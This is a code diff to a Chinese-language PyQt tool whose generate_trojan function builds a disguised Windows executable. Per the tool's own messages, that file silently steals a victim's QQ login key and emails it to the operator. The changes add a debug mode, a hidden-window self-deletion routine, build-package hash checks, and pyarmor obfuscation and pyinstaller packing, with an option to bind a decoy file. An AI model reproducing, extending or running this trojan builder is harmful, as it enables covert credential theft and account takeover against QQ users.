@@ -62,6 +62,7 @@ class Ui_Dialog(object):
         Dialog.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint | QtCore.Qt.WindowCloseButtonHint)
         Dialog.setFixedSize(Dialog.width(), Dialog.height())
         Dialog.setWindowIcon(QtGui.QIcon(get_file_path("./icon.ico")))
+        self.dialog = Dialog
         self.centralwidget = QtWidgets.QWidget(Dialog)
         self.centralwidget.setObjectName("centralwidget")
         self.label = QtWidgets.QLabel(Dialog)
@@ -124,7 +125,7 @@ class Ui_Dialog(object):
         self.lineEdit_3.setGeometry(QtCore.QRect(130, 42, 131, 20))
         self.lineEdit_3.setObjectName("lineEdit_3")
         self.pushButton = QtWidgets.QPushButton(Dialog)
-        self.pushButton.setGeometry(QtCore.QRect(40, 170, 226, 31))
+        self.pushButton.setGeometry(QtCore.QRect(120, 170, 147, 31))
         self.pushButton.setObjectName("pushButton")
         self.pushButton.clicked.connect(lambda: (self.textEdit.setText(""), Thread(
             target=self.generate_trojan).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
@@ -243,11 +244,18 @@ class Ui_Dialog(object):
             target=self.get_info).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
                                                                                                            "错误",
                                                                                                            "已有功能正在运行,请等待运行完毕!"))
+        self.checkBox_4 = QtWidgets.QCheckBox(Dialog)
+        self.checkBox_4.setGeometry(QtCore.QRect(40, 174, 101, 21))
+        font = QtGui.QFont()
+        font.setFamily("微软雅黑")
+        font.setPointSize(10)
+        self.checkBox_4.setFont(font)
+        self.checkBox_4.setObjectName("checkBox_4")
         self.retranslateUi(Dialog)
         QtCore.QMetaObject.connectSlotsByName(Dialog)
         self.output_signal = EmittingStream()
         self.output_signal.textWritten.connect(self.change_textedit)
-        self.textEdit.setText("Tips: 木马生成如果不知道smtp服务器可留空,将自动获取")
+        self.textEdit.setText("Tip: 木马生成如果不知道smtp服务器可留空,将自动获取")
 
     def retranslateUi(self, Dialog):
         _translate = QtCore.QCoreApplication.translate
@@ -278,6 +286,8 @@ class Ui_Dialog(object):
         self.pushButton_5.setText(_translate("Dialog", "QQ邮箱"))
         self.pushButton_6.setText(_translate("Dialog", "QQ群"))
         self.checkBox_3.setText(_translate("Dialog", "捆绑文件"))
+        self.checkBox_4.setText(_translate("Dialog", "调试模式"))
+
     def change_textedit(self, message: str):
         self.textEdit.setText(self.textEdit.toPlainText() + message)
 
@@ -595,10 +605,12 @@ nickname={nickname}
     def generate_trojan(self, reset_icon_path=False):
         sys.stdout = self.output_signal
         self.func_running = True
+        success = False
         logs = []
         installing_log = None
         encrypting_log = None
         packing_log = None
+        cmds = []
         try:
             if not os.path.isfile("Tools.zip"):
                 print("未检测到搭建包,请重新打开工具下载搭建包!")
@@ -606,9 +618,9 @@ nickname={nickname}
                 self.func_running = False
                 return
             print("正在验证文件完整性...")
-            if encrypt('Tools.zip', 'md5') == '563a84f871e7387d49e59ac79350037e':
+            if encrypt('Tools.zip', 'md5') == '5efc89053e5ac94b49281855498ee966':
                 pass
-            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e','ba44b872e7d53f5c7dfb1da1c0d114a2','6081a2b32ba7f94b8d1316dce70edf24']:
+            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e','ba44b872e7d53f5c7dfb1da1c0d114a2','6081a2b32ba7f94b8d1316dce70edf24','563a84f871e7387d49e59ac79350037e']:
                 print("失败,检测到您正在使用旧版搭建包,请删除现有搭建包重新打开工具下载新版搭建包!")
                 sys.stdout = sys.__stdout__
                 self.func_running = False
@@ -628,7 +640,7 @@ nickname={nickname}
                 self.icon_path = ''
                 self.checkBox_2.setChecked(False)
             print("环境已准备完毕!")
-            smtp_server = f'"{self.lineEdit.text()}"'
+            smtp_server = f'"{self.lineEdit.text().strip()}"'
             smtp_port = self.lineEdit_2.text()
             smtp_account = f'"{self.lineEdit_3.text()}"'
             smtp_password = f'"{self.lineEdit_4.text()}"'
@@ -672,6 +684,7 @@ nickname={nickname}
             zip_path = '.\\Tools.zip'
             # 文件存储路径
             if not os.path.isdir('data'):
+                print("检测到你是第一次安装,请注意关闭代理/vpn,否则将无法正常安装依赖导致生成失败!")
                 os.mkdir('data')
             save_path = '.\\data\\'
             # 读取压缩文件
@@ -692,14 +705,14 @@ nickname={nickname}
             if self.checkBox.isChecked():
                 _[0] = True
                 content += r"""
-import sys,os
+import sys,subprocess
 if os.path.basename(sys.executable) != 'python.exe':
     os.chdir(os.path.dirname(sys.executable))
 path = sys.argv[0]
 print(path)
 with open("1.bat", 'w', encoding='gbk') as f:
-    f.write(f"@echo off\nping -n 1 127.0.0.1>nul\ndel {path}\ndel %0")
-os.startfile("1.bat")
+    f.write(f"@echo off\nping -n 3 127.0.0.1>nul\ndel {path}\ndel %0")
+subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
 sys.exit(0)"""
             if self.file_path:
                 self.file_path = self.file_path.replace('/',__)
@@ -715,36 +728,66 @@ os.startfile(file)\n""" + content
             # content = content.replace("if clientkey is None:","if not clientkey:")
             # content = content.replace("--------登录网址--------","--------登录网址--------\nTips:如果出现qzone和mail均无法登录而qun可以登录的情况请尝试使用主界面的Key解析器进行解析登录\n")
             # content = content.replace("uin:{uin}","uin:{uin}\nclientkey:{clientkey}")
-            content = content.replace("ip:{ip}", "ip:{ip}\nTip: 如果邮件标题地址显示不全请访问 https://www.ip138.com 使用上方ip手动查询地址")
-            content = content.replace("Tips","Tip")
+#             content = content.replace("ip:{ip}", "ip:{ip}\nTip: 如果邮件标题地址显示不全请访问 https://www.ip138.com 使用上方ip手动查询地址")
+#             content = content.replace("Tips","Tip")
+#             content = content.replace("requests.get(f'https://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins={uins[i]}')", "requests.get(f'https://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins={uins[i]}',proxies={'http': None, 'https': None})")
+#             content = content.replace('requests.get("https://qifu-api.baidubce.com/ip/local/geo/v1/district")', 'requests.get("https://qifu-api.baidubce.com/ip/local/geo/v1/district",proxies={"http": None, "https": None})')
+#             content = """import os
+# os.environ['HTTP_PROXY'] = ''
+# os.environ['HTTPS_PROXY'] = ''
+# """ + content
+#             content.replace('content = "ERROR:未获取到任何在线的QQ!"', "continue")
             with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
                 f.write(content)
             print("开始下载打包所需文件...")
-            installing_log = subprocess.Popen(".\\data\\python.exe -m pip install pyinstaller==6.10.0 requests==2.32.3 pyarmor==9.0.3 -i https://mirrors.aliyun.com/pypi/simple",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            installing_log = subprocess.Popen(".\\data\\python.exe -m pip install pyinstaller --proxy=\"\" requests --proxy=\"\" pyarmor --proxy=\"\" -i https://mirrors.aliyun.com/pypi/simple",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             installing_log = installing_log.communicate()
             print("加密代码中...")
-            encrypting_log = subprocess.Popen(".\\data\\Scripts\\pyarmor.exe gen qkey_code.py --output=final_code --enable-jit",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            encrypting_log = subprocess.Popen(".\\data\\Scripts\\pyarmor.exe gen qkey_code.py --output=final_code",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             encrypting_log = encrypting_log.communicate()
             print("开始打包...")
-            packing_log = subprocess.Popen(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} .\\final_code\\qkey_code.py --paths=.\\final_code\\{f' --add-data {self.file_path};.' if self.file_path else ''} --hidden-import requests --hidden-import smtplib --hidden-import email.mime.text  --hidden-import concurrent.futures --noupx",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            cmds = [
+                ".\\data\\Scripts\\pyinstaller.exe",
+                "-F",
+                "-w",
+                *(['-i'] if self.icon_path != '' else []),
+                *([self.icon_path.replace('/', __)] if self.icon_path != '' else []),
+                ".\\final_code\\qkey_code.py",
+                "--paths=.\\final_code\\",
+                *(['--add-data'] if self.file_path else []),
+                *([f"{self.file_path};."] if self.file_path else []),
+                "--hidden-import",
+                "requests",
+                "--hidden-import",
+                "smtplib",
+                "--hidden-import",
+                "email.mime.text",
+                "--hidden-import",
+                "concurrent.futures"
+            ]
+            packing_log = subprocess.Popen(cmds,creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             packing_log = packing_log.communicate()
             if os.path.isfile("QQKey.exe"):
                 os.remove('QQKey.exe')
             os.rename(".\\dist\\qkey_code.exe", ".\\QQKey.exe")
+            success = True
             print("打包完毕!")
             print("文件名为:QQKey.exe")
             print("目标如果打开此文件将会获取QQkey并发送至你的邮箱")
             if _[1] == True: print(f"木马已捆绑文件{os.path.basename(self.file_path)},目标打开木马后将自动打开捆绑文件!")
             if _[0] == True: print("注意:运行完后程序自动删除!")
-            print("注意:当对方打开时程序将静默获取,并不会出现弹出窗口",end='')
+            print("注意:当对方打开时程序将静默获取,并不会出现弹出窗口",end='' if not self.checkBox_4.isChecked() else '\n')
+            if self.checkBox_4.isChecked():
+                raise Exception("调试模式所引发该错误以生成日志,请忽略这个错误")
             sys.stdout = sys.__stdout__
             self.func_running = False
             return
         except Exception as e:
             from QQKey_Tool import version
             reason = traceback.format_exc()
-            print("打包失败,发生致命错误!")
-            print("原因:\n"+reason,end='')
+            if not success:
+                print("打包失败,发生致命错误!")
+                print("原因:\n"+reason,end='')
             print("生成日志中...")
             scripts_files = []
             if os.path.isdir('.\\data\\Scripts') and os.path.isdir('.\\data'):
@@ -767,6 +810,9 @@ os.startfile(file)\n""" + content
 加密代码(标准错误):
 {encrypting_log[1].decode('utf-8') if encrypting_log is not None else '无'}
 {'-'*16}
+打包命令:
+{cmds}
+{'-'*16}
 打包程序(标准输出):
 {packing_log[0].decode('utf-8') if packing_log is not None else  '无'}
 打包程序(标准错误):
@@ -782,8 +828,10 @@ os.startfile(file)\n""" + content
             with open(f"ERROR_{local_time}.log", 'w', encoding='utf-8') as f:
                 f.write(content)
             print(f"日志生成完毕,已保存至ERROR_{local_time}.log")
-            print("您可以使用日志到Github提交issue(在主界面提供反馈打开)",end='')
-            print("您也可尝试将data文件夹删除后重新执行生成木马")
+            if not success:
+                print("如果你是第一次生成,请注意关闭代理/vpn,否则将无法正常安装依赖导致生成失败!")
+                print("您可以使用日志到Github提交issue(在主界面提供反馈打开)")
+                print("您也可尝试将data文件夹删除后重新执行生成木马",end='')
         self.func_running = False
         sys.stdout = sys.__stdout__
 
